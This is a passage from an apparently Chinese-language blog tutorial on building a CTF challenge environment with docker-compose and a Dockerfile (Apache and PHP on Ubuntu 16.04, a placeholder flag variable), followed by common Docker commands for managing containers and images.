class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up  -d   # 创建并启动所有服务（常用）</span><br><span class="line"></span><br><span class="line">docker-compose build    # 容器镜像创建(没启动)</span><br><span class="line"></span><br><span class="line">docker-compose stop     # 关闭所有服务</span><br><span class="line"></span><br><span class="line">Docker-compose 是一个用来把 docker 自动化的东西。</span><br><span class="line"></span><br><span class="line">有了 docker-compose 你可以把所有繁杂重复的 docker 操作全都一条命令，自动化的完成。</span><br><span class="line"></span><br><span class="line">Compose 是用于定义和运行多容器 Docker 应用程序的工具。</span><br><span class="line"></span><br><span class="line">通过 Compose，你可以使用 YML 文件来配置应用程序需要的所有服务。</span><br><span class="line"></span><br><span class="line">然后，使用一个命令，就可以从 YML 文件配置中创建并启动所有服务。</span><br><span class="line"></span><br><span class="line">文件名：docker-compose.yml</span><br><span class="line"></span><br><span class="line">YML</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">指定该文件版本</span></span><br><span class="line"></span><br><span class="line">version:&#x27;3&#x27;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">把每个子目录视为一个镜像，开始构建</span></span><br><span class="line"></span><br><span class="line">services:</span><br><span class="line"></span><br><span class="line">  web1:</span><br><span class="line"></span><br><span class="line">    # 此处仅允许 image, build, ports，禁止其他字段出现，如果有 volume，cmd 等设置需求，请在 Dockerfile 里进行文件拷贝或者申明。</span><br><span class="line"></span><br><span class="line">    image:ctf/test1#镜像名字</span><br><span class="line"></span><br><span class="line">    build:./web/#build的位置，docker会去web1中的dockerfile开始搭建</span><br><span class="line"></span><br><span class="line">    # restart: always</span><br><span class="line"></span><br><span class="line">    ports:</span><br><span class="line"></span><br><span class="line">      -&quot;5555:80&quot;#设置映射的断口</span><br><span class="line"></span><br><span class="line">    environment:</span><br><span class="line"></span><br><span class="line">      -FLAG=flag&#123;this_is_test_flag&#125;# 这里定义了flag,但是不会覆盖sh里的$FLAG</span><br><span class="line"></span><br><span class="line">    #   - FLAG=flag&#123;$(cat /proc/sys/kernel/random/uuid)&#125;  # 获取容器的uuid作为flag 会报错</span><br><span class="line">    </span><br><span class="line">- version  </span><br><span class="line">    说明了 yml 文件指明的版本号，一般我们使用 2，3 这两个版本。</span><br><span class="line">- services  </span><br><span class="line">    yml 文件的主体，定义了服务了配置。里面的 web 标签是我们自己定义的。  </span><br><span class="line">    build 表明了以 dockerfile 类型启动一个容器，后面跟的是 dockerfile 的路径，支持相对路径和绝对路径，在这个 yml 文件里面，表明 dockerfile 与 yml 处在同个目录下。</span><br></pre></td></tr></table></figure><p>容器的启动可以根据已有的镜像，如果定义了 image 这个标签，就会从本地搜寻相关镜像构建容器，如果本地找不到相关的镜像，就会从网上数据库搜寻相关的镜像。</p><p>但大家可能会产生疑问了，这里我们定义了 build 还有 image 两个不同的标签来构建镜像，那么容器到底要用 build 还是 image 来构建呢，这种情况下将按照 dockerfile 的方式来构建镜像，并且把镜像的名称定义为 image 标签里面的名称。</p><ul><li>environment<br>  构建了相关的环境变量，在这里我们是定义了一个 FLAG 环境变量，并且值为 flag{this_is_test_flag}<br>  定义之前要删除 shell文件中的定义变量，否则会报错</li><li>ports<br>  定义了映射的端口，5555:80 表示映射到本机的 5555 端口，后面的 80 端口则要与 Dockerfile 文件中 EXPOSE 的端口保持一致。</li></ul><h4 id="Docker-使用"><a href="#Docker-使用" class="headerlink" title="Docker 使用"></a>Docker 使用</h4><p>👉 <a href="https://www.runoob.com/docker/docker-dockerfile.html">Dockerfile 相关指令教程</a> 👈</p><p>文件名：Dockerfile</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">FROMubuntu:16.04</span><br><span class="line"></span><br><span class="line">LABEL Author=&quot;Ztop&quot;</span><br><span class="line"></span><br><span class="line">LABEL Blog=&quot;https://www.zeker.top&quot;</span><br><span class="line"></span><br><span class="line">ENVREFRESHED_AT 2022-03-01</span><br><span class="line"></span><br><span class="line">ENVLANG C.UTF-8</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">先写 修改源/更新 【如果必须的话】</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">替换源（这里可用sed或者直接COPY一个完整的sources.list来替换）</span></span><br><span class="line"></span><br><span class="line">RUN sed -i s@/deb.debian.org/@/mirrors.aliyun.com/@g /etc/apt/sources.list &amp;&amp; \</span><br><span class="line"></span><br><span class="line">    sed -i s@/security.debian.org/@/mirrors.aliyun.com/@g /etc/apt/sources.list &amp;&amp; \</span><br><span class="line"></span><br><span class="line">    apt-get update -y</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">防止Apache安装过程中地区的设置出错</span></span><br><span class="line"></span><br><span class="line">ENVDEBIAN_FRONTEND noninteractive</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">安装apache2</span></span><br><span class="line"></span><br><span class="line">RUN apt-get install apache2 -y</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">安装php</span></span><br><span class="line"></span><br><span class="line">RUN apt-get install php -y</span><br><span class="line"></span><br><span class="line">RUN apt-get install libapache2-mod-php -y  --fix-missing</span><br><span class="line"></span><br><span class="line">RUN apt-get install php7.0-mysql -y</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="comment">#安装mysql</span></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">RUN apt-get install mysql-server -y</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">RUN apt-get install mysql-client -y</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">然后才是复制文件，不推荐挂载卷</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ADD会自动解压压缩包，而COPY不会</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ADD html.tgz /var/www</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">将题目源码放进去</span></span><br><span class="line"></span><br><span class="line">RUN rm -rf /var/www/html/index.html</span><br><span class="line"></span><br><span class="line">COPY ./src/ /var/www/html/  </span><br><span class="line"></span><br><span class="line">WORKDIR /var/www/html/</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">启动脚本</span></span><br><span class="line"></span><br><span class="line">COPY ./run.sh /root/run.sh</span><br><span class="line"></span><br><span class="line">RUN  chmod +x /root/run.sh</span><br><span class="line"></span><br><span class="line">ENTRYPOINT [&quot;/root/run.sh&quot;]</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">设置环境变量</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">ENV FLAG=flag&#123;test_flag&#125;</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">暴露端口</span></span><br><span class="line"></span><br><span class="line">EXPOSE 80</span><br></pre></td></tr></table></figure><h4 id="构建运行"><a href="#构建运行" class="headerlink" title="构建运行"></a>构建运行</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">docker build -t ctf:v1 .            # dockerfile目录下输入构建命令，用来构建基于ubuntu:16.04的自定义镜像。</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">docker run -d -p 5555:80 -e FLAG=flag&#123;$(cat /proc/sys/kernel/random/uuid)&#125; 镜像id  # 添加系统</span><br><span class="line">docker run -d --name &lt;容器名称&gt; &lt;镜像名称&gt;:&lt;标签&gt;</span><br><span class="line"></span><br><span class="line">uuid作为动态flag字段</span><br><span class="line"></span><br><span class="line">docker ps                           # 查看是否运行</span><br><span class="line"></span><br><span class="line">docker exec -it 容器id /bin/bash     # 进入容器</span><br><span class="line"></span><br><span class="line">exit                                 # 在容器内退出</span><br></pre></td></tr></table></figure><p><img src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEAAgICAgJCAkKCgkNDgwODRMREBARExwUFhQWFBwrGx8bGx8bKyYuJSMlLiZENS8vNUROQj5CTl9VVV93cXecnNEBCAgICAkICQoKCQ0ODA4NExEQEBETHBQWFBYUHCsbHxsbHxsrJi4lIyUuJkQ1Ly81RE5CPkJOX1VVX3dxd5yc0f/CABEIANwBHwMBIgACEQEDEQH/xAAyAAACAwEBAQAAAAAAAAAAAAABAgADBQYEBwEBAQEBAQEAAAAAAAAAAAAAAAECAwQF/9oADAMBAAIQAxAAAAD5CRo6znTcxCN07nJzovAuZNXQTAp6PnCSQBDEkgARLGVqgZUaSEBAGViSSlIIwIRZYZUV4dRg+WHS5ucTQr8al/kshXLIVMzFcsJSLQtblhFuVFFkK5ZCpy1ILIlJcqq2ojsrRZUdwxxX1Bzvt6byVh53W8lmwSakkgro8ESUARLGVqZGVGDKQEAdHJIEVlKtXZXYWofOianCEBeaSWisFkrBZKoWP53LZXKYIJbHocuRUS8IBwgLH87loQWMaoXIFsjo2dK6Obmf4Iuxp4LpoYGnmghAIYK6WKIYiqwljK5FsSmDhEDKI6sMJKQwhDLZ6nVppWDIEu2DEOr5K8o6fHjwDVy6AMFeEEMEFklrcwivKEKpFYCNJKSpQGNQqu89lxobO3ahk9GxhVm/4PAU6j08dDtOO9mbLdKZVzUEulMLpTC6UwulMLhUC4VAtFYLW85LzQS6g1JS5eWl44+vndV6d8v5ug8HLOYnXXcZynj+hZ2px06LYXkPN1vtjhZv4lVxliSOIbEoC4FIuUrDtFUthU0YVblsjqwjo49DAZ0Ja/nB6G8oL9PElNt4NkOkgqsqx0cZHQsBgEdRGVgSQVlIwguWdHmk1cr3bxv4nrw+nDYspfh6Wo0/HL6/BoxMvcwtDQZO7jS+CPCoMpHSyU1212WAgiwCFWSAykIMpBFyXR5UdGAOl5vnGgnSmCBX0A88kI6MGSABCxlIykDSAgIRCIGAEgisJLGcPFLxzr+MY8c9BfzE73usnm5L3Xj5FRYSAlhJZCsW1qDHFlkK5ZCoWqlYsBXHAsaCh1Sx0dpW6LRfT4yXet83OnU59zizpvImIOkyV8M1XTIO3cuBN/zGTX0aS8++naZR6D0ry0BQK0EWwFQsCIGgqulljVGa9l2ZHZtbHjh0KYUXbfBkbGPIuvdhNc6vowzXYY+PDdTGWXQ2+UJrenANjFYNEg0rIwAlaIB1Cp//xAA0EAACAgECBAMFBwQDAAAAAAABAgARAxIhEyIxUUBBYRAgMlBxFCNCQ1KBwTBigpFgobH/2gAIAQEAAT8C92j1r3dLVdGu/i0CGwdj5GcPRvk/Yd/ZwsWtE5rYdfrKTh4Q19T0nCRRkLXytW0yIF010IuKq6C7X1qhPuuCxCn4pn01ioH4B4yyfZkzUy6Qt6RvNZpB+mcT7vISFJL9IWDm3NdqE1hbUcynvOJsw0ijGctp9BXi6+RH2hSxoewgqaM0nbY79JR7QY21oGBFmPjZSeU1fXxZ9zij4tP3nf8An2Y3Ax3fMl1+814xkx0drLH95qooOQDWDsbh245Lg6um9+LPyQ/KPOaFybrQ/UP5jlNgo2Hn3mLRzaqvyvpNKquUnHuCNrj6EoaL5ev1+RK5XpX+rhyOdVnr1nFeqvxlCVKEoShKEoShKEoShKEoShKEoShKEoSpUoShKEoShKEoShKEoShKEoShD7vaYioBvR/kD/EdwdtCfURBqYCOihcnKNmrrDjcC5wcnbxLe72mLIEB3f8AxMyZS2wZq9Yhp1PrNafeer3+0LoFcAjqKAEGgvkYN1U7eJbpLly5cvpLly5cuHMxv19JcuXLly5cuXLly5cuXLly5cuXLly4T7tXpE+zv3EfGydYosgX7WQqF9RfuaDpDd/FA1pM4q1czPqC1MIBypfeGlxAhVvWfKZFCcYqo2I/a5QYpqX8q6qAozY6S+oPLUypuFUbabvv6yubAvDFMovaFtGJKAPO3XeMoQZ6QbMPLpMwHIaold/EHy9osdJZ7zW93qN95ra71G4Xc/jP+5qaq1GPlJChWYDSAZZ6XBlIR921EjeEkmyfnaJrMbFa0BHVV6HeYgp12LpblI+NiForOC3Sxqr4fOcPYEsBfS4+OwhFAcMWYMJNbiyLqcKlViwFzKtHIF0UB23EyY+c9AAFjoUO/iA5Umpx2qh7MTquu73WprVV0pe/UmcXHrOQXq7eVwtjZV1XYFbecOZGRUa6C/8AcOewOfINqodI7grjHYRsyk5uvMBU44tt2Fgbj0jtqPxE/X57wl0btzEX7yi2A7mMNLMOx8aCvD+K0roe/swEhcxH6JpZ8eIjemNzKxUZ6P5kyozENX4FJ/eNqtCdS845D/EZmb7SCdh0/wB/8jxYttRjYrIPaNpvl6QINIZmq+m1zMgOXIxNAVODZFNykXf0mFVt9BJvGfKDDb6Q10N59n5kFkar6iuk4ZPwBmH0nDUBS71fpcGJeXU9FvScEBSXeubT0uNgA1jXzLOCvIOJuw7ThgC3at67zgfHZ2Xtv1i4LF81XQpbnCrLwyfPrFxX1Nc+mcFOY8T4TvtFTQcou/ur/rh2EbK7dT7BkXQFZbrpvUOYMXtNmrb6TjURS8oFV9YuUIToUjlrrOMNV6OopvWLkVHDKvT19nEUqoZLr1nFXltLK+sOW1o/r1Q5rbI1fEKjuqnEdFkIPOcQEU63vfWpxRq1FTflRqHKGB1r+K9tpsdlTmvaZclZV/t/9nE2yCviNzjf2/l6fmP/xAApEAEAAgEDBAEEAgMBAAAAAAABABEhEDFBIFFhcYEwQJHBodGx4fBQ/9oACAEBAAE/IemgEqdnv04Od7MfZHQ6uly7PSe4EJ1WOVf1o5jQuRQjtzGjb15BzFEPDMLjSbTF7kypGDBnffMrhjBUvb1NoHebx+PsjodXVoWrRWdLIgEb0xL6hkp85gUEJv8ArmW4VAF4B8kAbANGs/DL79brOE7TIqxn0fZHQ6sqEVKlSpUqVKlSpUqVKlSpUqVKlSpUolEqBKlSiJKlQY0JVG3to4GntBcPUb+pju1XXz2lQ+RkqcysCN/qnWdDrs0IKIjST/uD4d4qqu8v0bD3lqjfkqf6wTPxIud2MY0KBktx+PqnWdDrslwZemNMaYmJZpjS5iY1uXrZMTGo6Y0ddmhvo7v2R1nQ6uhvosbnXk2PDxP2GHlA+wYtLeaia9cWUX6Zy+QqXcceo/ZnQ6uhvo7uhLIwO9jZ7gAtvfsTBqoELBQezH6hpz0nQw0Z4ICeCNziNRjiHanininij2p4J4p4p4tDxTxTxTwSkpPFPFoeKeKeKPah2J4p4p4o9qeKeKEDQ0d47ek7sfIgRIZ2U/zMr7tb1GABIVbH5jJBQ00jXupge0tLLDyfc7PnQ0d47ekCE7eAmZHtd5gIbAWWgWwad7R6O8EYHlqZvbeDZZz9z/klYGVibYmvT9ysrKysrDgvlQL91KysrKysrKysrKysrKysrKysrKysrKysrCTQ30d2Wobp+4lXJKbh3JhwW7uAiUpY08aIDW06EMekh8fauhvo7stlwfuBJZqqz3lYRSWkIwInDFaEO0ODjMtsIiywZbMueQZHK+0I7LZQU+OSVWs0AyOVKBV8m3vmAArAgwPcaW412yhsUdAV86Oppz0MOh1dDfR3Zs9f3DRIKROSLlKq7q+ZQya3tmWh0tm8kWtVqrtt2gdFFJV94cAEXQpMBZRsQ6zVl28xEhXlb0dTTnpOh1dDfR3ZmHQ9J0Oppz0MOh1dDfRV7DmOFKsxwPIO0vJ2wN734mwZrC0R9xJcNZy/0g+d4WtJhU1TBb65lE24ztI0Ltu9/wAEqoj/AIHPeAqZ6XbJ4gAQ2CJsjq6mnPQw6HV0N9L8bzbgeZdtsoGJsC/6izuA4G3FZlJVw+55mNXbhQNvUFqkpNw/qBk0zGSfOIPrup/Mbgwnw7y8QdHcEV3mZ2e+/V1NOZcvR6WGjob6O7966uhvo7srABU9q7dWS6oPzMy3Yfj6ty5et6XrcdDfR3YWztFWTw0RCk/aZYOz7W3mJFTQs32hFtkfMX7SfDjnxhNkmHaqY6KlSpXRUrSpUqVK0qVKlR0N9Hd+yPrOhvpSbn2R111uhvAcZHvxBVQNxxRM/L2l+ZVU4OeJyq3q1U4hc5beVRuxEAqGmj+5ukWVLquDvL4Q7mPSWWoc/wDWCsboGx3dpgaFYZAO1sFEriP9Eoaw2lYr3M74dDYX3mbV0ALY37TDtRs5HLjEsirOXHy9pwXs/SONwglc8/iIF2qv68zaAUHax+jWrobw2hxdw2sHjTcLVRycM8Z0OR5DCpyW93N2Y2WCs2bedpwq1G8W5OzGk7t7LfxpYEsRKY7MEHUqHAa2sjOWVJ9z0N17Rt2WOz5JVuqglmd+GDPMDhgxXMFLbRthe/eDldr0VQ7QqQNxa53Mb8L7tqnPu5f5+o/+Iz//xAAnEAEAAgEEAgICAgMBAAAAAAABABEhEDFRYSBBgbFxoTCRQMHw0f/aAAgBAQABPxDxSYX2FFN6dajKmglCVngfGpRo6hKnuUSiURCtFEolGgMSibNCsMbnJweHmOrCQNC+u+gMRluEBhYluxU6jEW0bi602D28jUZdOq5FEUh1glwSiyooBG9qqQ9r2bIkCFpSBXigZ/gdTT3p86Oiu5Xcp50G2+mzVzDAWug2DQs7/lLV2asix0tc2rtcV6fs9irRIxQ2p6lmRul4fU+zOPzMocmEBEGqQqkYB+zxzM6Opp70zMxutGZmZ0F1Mx0SsBZWV7lICUlO5TuI7gJXuUlIC5SU7lO4iUlICvcp3KXKaH5IioEp3Kdz8kCAqU7gU03/AAy4GtQbtFylapuPFGrW5ZcbKG9BOLX5TIw2emv/AEgslCjRQauICBbAAeYw28DfwfF78HbyDbTY/Om74Y/ZFiNIk9IiKcPiigCptXKrDoD23NNfpl/F4uhqBqAJs1Z3ua1kYo42nYqNpSBiUStDeVK0fBRPco4lEqO2ijiV1K0G0qbH5lIV/DKRoUWXygnMHlLOZfKLymDeWcy+Us5gLl8pfKWcxTmUlIJzLOZk3l8pfKWcxSt4HMs5l8pZzEcwSt5ZzEI0+p0/e0IXqw2mdTeZ40+I6qXPczxM8TPEdttAvEzxM8aDafE2afU6UJ7lGssqoff+hHNEKWM7uuDgjoWNcO2bVSAGJ9afIWQFSPVuQNUK0DbwN5ZLJcdTT3LJZLIpWgSWSzQJUsmzT6nT97UfcUoKvZgsVoBuDOxA7s1bsAhYaDbwN/B12eR28jZps0lvb06yA9O7/byAMAeEABdt4BBk651wo0DNt4JKh5EAQFGgGUPem74dNyf8HbCBWcLP4g1QYNkOLTb8GlGHzHkIrZl3yzK26JauAmplaX6Zy7ssly9DXPjbpbLZbrctlutsbXRu03J/0dscm2UD82MoKNFGqfiJrSZwDFmg4CIJYBqWn3wFYsB5oNwElUeB/i7UdbLGzszoZsB3hMLn/dOhnQzoZ0M6GB9Ddb/MBZ1s62dLDgZ1s62dDOhnQzoZ0M6GdDOhnQzoZ0M62dDOlnWw42dDOhhEL3lQv9GVP3pbLdAO1QDPVW7iM0itksmxLi/8hY+fAWrGvZo06MZxaZlStGc0+N7rdyvOtaZTrTKZT4BrT6nT96Iatu/aU2LGBaDjkh4JWIo8MBawhYkbIS7NtgiY9YBayWEQeBCIhbNB5qJjTyhMEhykxd9d1ZgsToaFqy9hDiVQFBix65RcyBlUXmA42HF2hQwWSjjxKNFHEo4lHEGHRRxKOJRoAqUcTZp9Tof7of7v20VFalYlIwC2UEktuwOcqBiO2K0t1b7MMSujaRXv+ECBkAYBvK4ZbsKsBTgYO5WWxoXdCVphJV0Ebtc3ofIT+VldwaiVoqV2yu2Jhgldsrtldz0gYldzZp9Tpf5otMu2jMzKZaG0bmZmbpmZmfBapnRmZmZamWmepnqZ0F1MzZp9To8h/efZMoKQPte7Y3VoY7tXMzGqAFAZsSoZ7Sn1s1Elg9hGgC02yD1cVQOogHvAgPq5XA0xRHg2oGQXW4S+KzwsQRmy3oNNiQBedLgKLKFw7K8ZAn6KqwCha92BJZL8Cl6LlksiKiq5cs1CVLJs0f6MuYhTFiVjVF0RVbVllQNSQqN0sWS0jCb2ANCNgHLBQaXO06qLjxqjkCluZVJqI2xQstRuodVgaG6Ze8Qkwu/ZVOJUtXAMLFg2gXXclgLGBTEAHt/to0s8LKlkvQtpsh4tmmzT6nT97QlaujqbyiUSiOpKnuVKJRExCV4CVNmn1Oj/ALo23MWzB77XCXLlxZz0DvVqnOItVdquXLhLly4uty/ApxFsg1ovQsvRs0+p0L80Tr9+Kt0pU2gCPDSA09xCis4nZ71QLbMLk8uCwC2F2B3gVbnCMOLV2eVwlMpgMtLS3gqW0U6LS2pXiGzQ/oyof7v4yVKlRNRZKlMplavnt0+p0aFhZZelks0s0vwPB212eVaE8tmn1MCoQ0bKPuxlc4LM8LYjVEwGuGNxNyzQJiA4ikNAsgBSgsMS/ImBYSk4DZgbuq9b3UucHZiZRYtu8tOHkoz8MIUS4ULW5AL8oXtFcVcuAG92Pe8NYSfVW9J3LlDIyOptHcBMwSy9JzQGN7dHMQLKLSkutaQENwspF097Istgm74QtbtyCsnJlthXdKuwe9hRr+CtFOm3R/ow1hqDhmCz3BVy45abQlZOBsjtdeaIlFBlDNgsOdfkxYpgibNgbTNdSCvtAEhEwXLwU3AAaAnK5VTYNNxp446DYqbqWfby+xVVNtt3Y11naKowhL1jA3UMaFnG8N2CwbwosWcNiJNKW89rJYljmTcQZ7/MVSBawqR70RylrveNl+h8YEXLl6X5nGg0/wAhDzPJfK5c2T//xAAvEQABAgIGCAYDAAAAAAAAAAABABECIQMQIDFB0RIwQFFhcaHhMkKBkbHBUJLw/9oACAECAQE/AKsW4t7Lt1DresTz1+L4u67dA2xQ3wuMQobhyH4M3en2sTsImnGuesEBdujZLJrT2imqoYKGKCIxmYPRRwQilMMNzshcDwH1mmmRxPyyAf8AZlg+DZZrfwJFhk1TVNslGYBENO5UsVGfAL2nyRvG7RHu5U2R83OSOPOLsjfLfraOlgpNLReR2KioRRmM6ROkUPEDuA+XQDCHg3QMm1LWTIoXPVlVm1gTZsU8jyfo+pewPt1kR6EMsSeJPuXRQkQ2BdNJv65rf//EADARAAIAAgcGAwkAAAAAAAAAAAERAAIDECEwQVFhEiAxkaHBQHHRBAUyM0JSYoGx/9oACAEDAQE/AKmE9AYXfoVAtIGb6RgPLdN1YloBD79S9x1CHdnFZQe90dxQoVwrvGMB4E2Xi3jbCbjPzd/IJS3FLsytZODxWpHJ+kOwH8R/HBs5OMs2RyJ9Iy1D8DlWbmkE5kOwRtRQSUw+ZNYGhm49ahg8oH0ecr7wPhlf2jmr2WYTCy4N1LLs4wQwRmX0UPv1LgHhoR0N04ddF7rp6SgFIE5kRLocYnl2J5pdoTI8RwNWdWujqwdeK17rcUKse0U4k2BSzCVJOtVEVYfoQIzjF7//2Q==" alt="文件目录总览"></p><ul><li><a href="https://yeasy.gitbook.io/docker_practice/image/commit">Docker — 从入门到实践</a></li></ul><h5 id="拉取查看篇"><a href="#拉取查看篇" class="headerlink" title="拉取查看篇"></a>拉取查看篇</h5><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>1<br><br>2<br><br>3<br><br>4<br><br>5<br><br>6<br><br>7<br><br>8</td><td>docker pull ubuntu:16.04                # 拉取对应镜像<br><br>docker images                                # 查看当前系统中存在镜像<br><br>docker ps                                  # 查看运行中的容器<br><br>docker ps -a                               # 查看所有容器（包括已结束运行的）<br><br>docker cp 主机文件名 容器id:容器指定目录  # 将主机文件复制到指定位置，反之则交换位置</td></tr></tbody></table><h5 id="停止删除篇"><a href="#停止删除篇" class="headerlink" title="停止删除篇"></a>停止删除篇</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">docker stop 容器id                     #停止指定容器</span><br><span class="line"></span><br><span class="line">docker stop $(docker ps -a -q)      #停止所有已经运行的容器</span><br><span class="line"></span><br><span class="line">start</span><br><span class="line"></span><br><span class="line">docker rm 容器id                       #删除指定容器，删除前先停止</span><br><span class="line"></span><br><span class="line">docker rm $(docker ps -a -q)        #删除所有已经停止的指令</span><br><span class="line"></span><br><span class="line">docker rmi 镜像id                    # 删除指定镜像</span><br><span class="line"></span><br><span class="line">docker rmi -f $(docker images-q) 删除全部 -f 强制</span><br></pre></td></tr></table></figure><h5 id="进入退出容器篇"><a href="#进入退出容器篇" class="headerlink" title="进入退出容器篇"></a>进入退出容器篇</h5><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>1<br><br>2<br><br>3</td><td># docker exec -it 容器id  &#x2F;bin&#x2F;bash          # 进入容器的bash界面<br><br>docker attach 容器id                        # 进入容器内部<br><br>exit                                    # 进入docker内部后退出容器</td></tr><tr><td></td><td></td></tr></tbody></table><p>之前的 docker exec -it ID &#x2F;bin&#x2F;bash 其实并没有进入这个容器，而是弹了一个 bash 出来让我们能在容器里操作，而 attach 才算进入了容器内部。</p><h5 id="查看相关配置"><a href="#查看相关配置" class="headerlink" title="查看相关配置"></a>查看相关配置</h5><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>1<br><br>2<br><br>3<br><br>4</td><td>docker port 容器id                                   # 查看容器映射端口<br><br>netstat -tlnp                                        # 查看主机开放端口<br><br>systemctl status firewalld                        # 查看防火墙状态<br><br>systemctl stop firewalld                        # 暂时关闭防火墙</td></tr></tbody></table><p>导出导入篇</p><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>1<br><br>2<br><br>3<br><br>4</td><td>docker export 容器id &gt; ctf.tar                        # 导出为tar文件<br><br>docker save 镜像name  &gt; .&#x2F;ctf.tar                # 将→指定镜像名←保存成 tar 归档文件<br><br>cat ctf.tar | docker import - ctf               # 可以这样导入<br><br>docker load&lt;ctf.tar                                # 载入镜像包</td></tr></tbody></table><h5 id="小-Tip："><a href="#小-Tip：" class="headerlink" title="小 Tip："></a>小 Tip：</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- docker save 